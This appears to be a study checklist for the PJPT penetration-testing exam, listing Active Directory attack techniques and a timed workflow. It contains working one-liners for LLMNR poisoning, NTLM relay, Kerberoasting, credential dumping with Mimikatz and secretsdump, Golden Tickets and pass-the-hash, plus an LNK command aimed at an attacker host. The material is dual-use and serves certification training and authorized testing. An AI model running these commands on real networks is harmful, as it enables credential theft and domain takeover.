# PJPT Preparation - Master Checklist & Roadmap

## 🎯 Quick Reference Index

This repository contains comprehensive guides for **Practical Junior Penetration Tester (PJPT)** preparation. Each document focuses on specific attack techniques commonly encountered in Active Directory penetration testing.

## 📚 Available Documents

### Core Attack Techniques
- **[Kerberoasting](./kerberoasting.md)** - Service account password extraction and cracking
- **[Token Impersonation](./token-impersonation.md)** - Post-exploitation privilege escalation via token stealing
- **[LNK File Attacks](./lnk-file-attacks.md)** - Malicious shortcut file creation for credential theft
- **[GPP/cPassword Attacks](./gpp-cpassword-attacks.md)** - Group Policy Preferences credential extraction
- **[Mimikatz Overview](./mimikatz-overview.md)** - Comprehensive credential dumping and Kerberos attacks
- **[NTDS.dit Extraction](./ntds-dit-extraction.md)** - Active Directory database dumping and hash analysis
- **[Golden Ticket Attacks](./golden-ticket-attacks.md)** - Ultimate domain persistence via krbtgt compromise
- **[Recent AD Vulnerabilities](./recent-ad-vulnerabilities.md)** - ZeroLogon, PrintNightmare, Sam the Admin

### Strategic Approaches
- **[Post-Compromise Attack Strategy](./post-compromise-attack-strategy.md)** - Systematic methodology for post-exploitation activities
- **[Post-Domain Compromise Strategy](./post-domain-compromise-strategy.md)** - What to do after achieving Domain Admin access
- **[Initial Internal Attack Strategy](./initial-internal-attack-strategy.md)** - First steps after gaining internal network access
- **[Domain Enumeration](./domain-enumeration.md)** - Active Directory reconnaissance techniques

### Network-Level Attacks
- **[SMB Relay Attacks](./smb-relay-attacks.md)** - NTLM relay attack techniques
- **[LLMNR Poisoning](./llmnr-poisoning.md)** - Link-Local Multicast Name Resolution attacks
- **[IPv6 Attacks](./ipv6-attacks.md)** - IPv6-based attack vectors
- **[Passback Attacks](./passback-attacks.md)** - Printer and device credential extraction

### Credential Attacks
- **[Pass Attacks](./pass-attacks.md)** - Pass-the-Hash, Pass-the-Ticket, and related techniques

## 🚀 PJPT Exam Checklist

### Phase 1: Initial Access & Enumeration (30 minutes)
```bash
# ✅ Network Discovery
nmap -sC -sV -oA initial_scan target_range
```

#### LLMNR/NBT-NS Poisoning
- [ ] **[LLMNR Poisoning](./llmnr-poisoning.md)** - `responder -I eth0 -wrf`
- [ ] **[SMB Relay](./smb-relay-attacks.md)** - `ntlmrelayx.py -tf targets.txt -smb2support`
- [ ] **[IPv6 Attacks](./ipv6-attacks.md)** - `mitm6 -d domain.local`

#### Initial Credential Gathering
- [ ] **[Passback Attacks](./passback-attacks.md)** - Target printers and IoT devices
- [ ] **Password Spraying** - Test common passwords against user lists
- [ ] **[Pass Attacks](./pass-attacks.md)** - Use any obtained credentials immediately

### Phase 2: Post-Compromise Quick Wins (30 minutes)
```bash
# ✅ Quick Assessment with any valid credentials
crackmapexec smb target_range -u username -p password --shares
```

#### Immediate Post-Compromise Actions
- [ ] **[Kerberoasting](./kerberoasting.md)** - `GetUserSPNs.py domain.local/user:pass -request`
- [ ] **[GPP/cPassword](./gpp-cpassword-attacks.md)** - `auxiliary/scanner/smb/smb_enum_gpp`
- [ ] **Secretsdump** - `secretsdump.py domain.local/user:pass@target`
- [ ] **[LNK File Attacks](./lnk-file-attacks.md)** - `netexec smb target -M slinky`

#### Credential Dumping & Analysis
- [ ] **[Mimikatz](./mimikatz-overview.md)** - `privilege::debug` → `sekurlsa::logonpasswords`
- [ ] **[Token Impersonation](./token-impersonation.md)** - `load incognito` → `list_tokens -u`
- [ ] **Hash Cracking** - `hashcat -m 13100 hashes.txt rockyou.txt`

### Phase 3: Deep Enumeration & Privilege Escalation (60 minutes)
```bash
# ✅ Comprehensive Domain Analysis
bloodhound-python -d domain.local -u user -p pass -gc dc.domain.local -c all
```

#### Domain Environment Mapping
- [ ] **[Domain Enumeration](./domain-enumeration.md)** - Comprehensive AD reconnaissance
- [ ] **BloodHound Analysis** - Privilege escalation path identification
- [ ] **Service Enumeration** - SQL, Exchange, file servers, etc.
- [ ] **[Recent AD Vulnerabilities](./recent-ad-vulnerabilities.md)** - `crackmapexec smb range -M zerologon`

#### Advanced Attack Techniques
- [ ] **Delegation Attacks** - Constrained/Unconstrained delegation abuse
- [ ] **Certificate Attacks** - AD CS vulnerabilities (if present)
- [ ] **Backup System Targeting** - Often contain high-privilege credentials
- [ ] **Application-Specific Attacks** - SQL injection, web app vulnerabilities

### Phase 4: Lateral Movement & Persistence (30 minutes)
```bash
# ✅ Systematic Lateral Movement
crackmapexec smb target_range -u admin -H hash --pwn3d
```

#### Lateral Movement Techniques
- [ ] **Pass-the-Hash** - `psexec.py -hashes :hash admin@target`
- [ ] **Pass-the-Ticket** - `kerberos::ptt ticket.kirbi`
- [ ] **Golden/Silver Tickets** - `kerberos::golden` for persistence
- [ ] **WMI/WinRM** - Alternative execution methods

#### Persistence & Impact
- [ ] **Backdoor Accounts** - Create domain admin accounts for persistence
- [ ] **Data Extraction** - Identify and document sensitive data access
- [ ] **Service Disruption Testing** - Demonstrate impact potential
- [ ] **Complete Domain Compromise** - NTDS.dit extraction if possible

### Phase 5: Post-Domain Compromise - "Welcome to My Domain!" 🦝 (60 minutes)
```bash
# ✅ Maximum Value Demonstration
secretsdump.py domain/admin@dc.target.local -ntds
```

#### **[Post-Domain Compromise Strategy](./post-domain-compromise-strategy.md)** - Complete Value Demonstration
- [ ] **[NTDS.dit Extraction](./ntds-dit-extraction.md)** - `secretsdump.py domain/admin@dc -just-dc-ntlm`
- [ ] **Password Cracking Analysis** - `hashcat -m 1000 ntds_hashes.txt rockyou.txt`
- [ ] **[Golden Ticket Creation](./golden-ticket-attacks.md)** - `mimikatz "kerberos::golden /krbtgt:HASH"`
- [ ] **Sensitive Data Discovery** - Enumerate shares for confidential information
- [ ] **Persistence Establishment** - Golden tickets and backdoor accounts
- [ ] **Business Impact Documentation** - Quantify the compromise impact
- [ ] **Attack Chain Validation** - Test alternative compromise methods
- [ ] **Professional Cleanup** - Document and remove all persistence mechanisms

## ⚡ Quick Command Reference

### Essential One-Liners
```bash
# Kerberoasting
GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request

# GPP Password Extraction  
auxiliary/scanner/smb/smb_enum_gpp

# Credential Testing
crackmapexec smb target_range -u user -p pass --shares

# Token Impersonation
load incognito; list_tokens -u; impersonate_token DOMAIN\\admin

# LNK File Deployment
netexec smb target -d domain -u user -p pass -M slinky -o NAME=doc SERVER=attacker_ip

# Mimikatz Credential Dump
privilege::debug; sekurlsa::logonpasswords

# BloodHound Data Collection
bloodhound-python -d domain.local -u user -p pass -gc dc.domain.local -c all

# Pass-the-Hash
psexec.py -hashes :ntlm_hash admin@target_ip
```

### Hash Cracking Quick Reference
```bash
# Kerberos TGS-REP (Kerberoasting)
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# NetNTLMv2 (from Responder)
hashcat -m 5600 netntlmv2_hashes.txt rockyou.txt

# NTLM (from secretsdump)
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

## 🎯 PJPT Success Strategy

### Time Management (4-6 hours total)
1. **Hour 1**: Network discovery and initial access attempts
2. **Hour 2**: Post-compromise quick wins and immediate credential gathering
3. **Hour 3-4**: Deep enumeration and privilege escalation
4. **Hour 5-6**: Lateral movement, persistence, and documentation

### Documentation Priorities
1. **Clear Attack Chain** - Document step-by-step progression from initial access to domain admin
2. **Command Evidence** - Include exact commands used and their outputs
3. **Impact Assessment** - Demonstrate business impact of compromise
4. **Remediation Recommendations** - Provide specific mitigation strategies
5. **Timeline** - Show progression and persistence of access

### Common Pitfalls to Avoid
- [ ] **Don't Skip Quick Wins** - Always try Kerberoasting and GPP attacks first
- [ ] **Don't Forget Token Impersonation** - Check for high-value tokens after gaining admin access
- [ ] **Don't Overlook Legacy Systems** - Older systems often have exploitable vulnerabilities
- [ ] **Don't Rush Documentation** - Take screenshots and notes throughout the process
- [ ] **Don't Ignore Lateral Movement** - Demonstrate access to multiple systems

## 🔗 Integration Points

### Attack Chain Combinations
- **LLMNR Poisoning** → **Pass-the-Hash** → **Token Impersonation** → **Domain Admin**
- **Password Spraying** → **Kerberoasting** → **Lateral Movement** → **Mimikatz** → **Golden Ticket**
- **LNK File Attack** → **Credential Capture** → **GPP Enumeration** → **Service Account Compromise**

### Tool Integration Workflow
1. **Responder** captures initial credentials
2. **CrackMapExec** tests credential validity and finds admin access  
3. **Impacket tools** perform targeted attacks (secretsdump, GetUserSPNs)
4. **Metasploit** provides automated enumeration (GPP, SMB enumeration)
5. **Mimikatz** extracts additional credentials from memory
6. **BloodHound** maps privilege escalation paths
7. **Manual techniques** fill gaps where automated tools fail

---

## 📝 Final Notes

This checklist represents a **systematic approach** to Active Directory penetration testing aligned with PJPT examination requirements. Each technique builds upon the previous ones, creating a comprehensive attack methodology.

**Remember**: The goal is not just to achieve domain admin access, but to demonstrate a thorough understanding of the attack chain, document findings professionally, and provide actionable remediation advice.

**Practice Environment**: Test all techniques in a lab environment before the exam. Tools and commands may behave differently across various Windows versions and domain configurations.

**Time Management**: Stick to the time allocations suggested above. It's better to have partial access with good documentation than complete access with poor documentation.

Good luck with your PJPT examination! 🚀 